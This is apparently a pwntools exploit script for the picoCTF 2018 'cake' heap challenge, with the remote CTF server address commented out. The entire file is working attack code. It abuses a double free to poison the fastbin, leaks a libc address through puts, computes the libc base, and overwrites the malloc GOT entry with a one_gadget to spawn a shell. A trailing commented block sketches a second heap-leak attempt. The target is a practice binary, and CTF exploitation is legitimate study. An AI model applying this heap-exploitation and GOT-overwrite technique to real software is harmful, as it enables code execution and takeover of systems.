from pwn import *

def makeCake(name, price):
	p.recvuntil('>')
	p.sendline('M')
	p.recvuntil('>')
	p.sendline(name)
	p.recvuntil('>')
	p.sendline(str(price))

def serveCustomer(index):
	p.recvuntil('>')
	p.sendline('S')
	p.recvuntil('>')
	p.sendline(str(index))

def inspectCake(index):
	p.recvuntil('>')
	p.sendline('I')
	p.recvuntil('>')
	p.sendline(str(index))
	return p.recvuntil('total')

def waitForCustomers():
	p.recvuntil('>')
	p.sendline('W')

p = process('./cake')
# p = remote('2018shell.picoctf.com', 39932)
libc = ELF('./libc.so.6')

libc_puts = libc.symbols['puts']
puts_plt = 0x603028
malloc_plt = 0x603078
one_gadget_offset = 0x4526a
shop_address = 0x6030f0

makeCake('choco', 0x21) #0
makeCake('walnut', 0x0) #1

serveCustomer(1)
serveCustomer(0)
serveCustomer(1)

makeCake('pineapple', 0x6030d8) #2
makeCake('brownies', 0) #3
makeCake('pot brownies', 0) #4
makeCake(p64(puts_plt), 0x6030d8) #5

leak = inspectCake(0)
puts_addr = int(leak[24:39])
libc_base = puts_addr - libc_puts
one_gadget = libc_base + one_gadget_offset
log.info('libc_base: 0x%x', libc_base)

serveCustomer(1)
serveCustomer(3)
serveCustomer(1)

makeCake('test', 0x6030d8) #6
makeCake('test', 0) #7
makeCake('test', 0) #8
waitForCustomers()
makeCake(p64(0), 0) #9

makeCake(p64(malloc_plt), one_gadget) #10

p.recvuntil('>')
p.sendline('M')

p.interactive()






















































































# serveCustomer(7)
# serveCustomer(8)
# serveCustomer(7)

# makeCake('pineapple', 0x6030d8)
# makeCake('brownies', 0)
# makeCake('pot brownies', 0)
# makeCake(p64(shop_address-8), 0x21)

# heap_leak = inspectCake(7)